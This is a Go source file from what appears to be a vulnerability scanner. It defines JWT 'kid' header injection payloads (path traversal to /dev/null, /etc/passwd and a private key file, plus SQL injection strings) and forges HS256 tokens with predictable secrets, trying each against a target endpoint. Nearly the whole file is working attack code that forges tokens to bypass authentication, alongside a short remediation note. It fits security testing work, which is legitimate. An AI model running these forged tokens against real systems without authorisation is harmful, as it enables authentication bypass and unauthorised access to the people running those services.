package jwtengine

import (
	"DORM/models"
	"encoding/base64"
	"encoding/json"
	"fmt"
)

// KIDPayloads are 'kid' (Key ID) header injection payloads targeting path
// traversal and SQL injection in the server's key-lookup logic.
var KIDPayloads = []struct {
	KID    string
	Secret string // HS256 secret to use when KID is injected
	Label  string
}{
	{"../../../../dev/null", "", "KID Path Traversal → /dev/null (empty secret)"},
	{"../../../etc/passwd", "", "KID Path Traversal → /etc/passwd"},
	{"' UNION SELECT 'hacked'-- -", "hacked", "KID SQL Injection (UNION)"},
	{"1 OR 1=1-- -", "secret", "KID SQL Injection (boolean)"},
	{"../keys/private.pem", "", "KID Traversal → private key file"},
}

// BuildKIDToken creates a JWT with a manipulated KID header field.
func BuildKIDToken(origPayloadB64, kid string, secret []byte) string {
	headerMap := map[string]interface{}{
		"alg": "HS256",
		"typ": "JWT",
		"kid": kid,
	}
	headerJSON, _ := json.Marshal(headerMap)
	headerB64 := base64.RawURLEncoding.EncodeToString(headerJSON)
	return models.SignHS256(headerB64, origPayloadB64, secret)
}

// RunKIDInjectionAttack (Attack 4): tries each KID payload, hoping the server
// uses the attacker-controlled 'kid' value directly in a file/SQL key lookup.
func RunKIDInjectionAttack(target models.ScanTarget, origPayloadB64 string, testToken func(tok, endpoint string) bool) *models.Vulnerability {
	for _, kidProbe := range KIDPayloads {
		secret := []byte(kidProbe.Secret) // may be empty → empty HMAC
		tok := BuildKIDToken(origPayloadB64, kidProbe.KID, secret)

		if testToken(tok, "/") {
			return &models.Vulnerability{
				Target:   target,
				Name:     "JWT KID Header Injection",
				Severity: "CRITICAL",
				CVSS:     9.8,
				Description: fmt.Sprintf(
					"JWT 'kid' (Key ID) header parameter injection successful.\n"+
						"Technique: %s\nKID Value: %s\n"+
						"Attacker can forge arbitrary tokens by controlling key lookup.",
					kidProbe.Label, kidProbe.KID,
				),
				Solution:  "Validate 'kid' parameter strictly. Never use it in SQL queries or filesystem paths.",
				Reference: "CWE-20 / OWASP JWT Security Cheat Sheet",
			}
		}
	}
	return nil
}
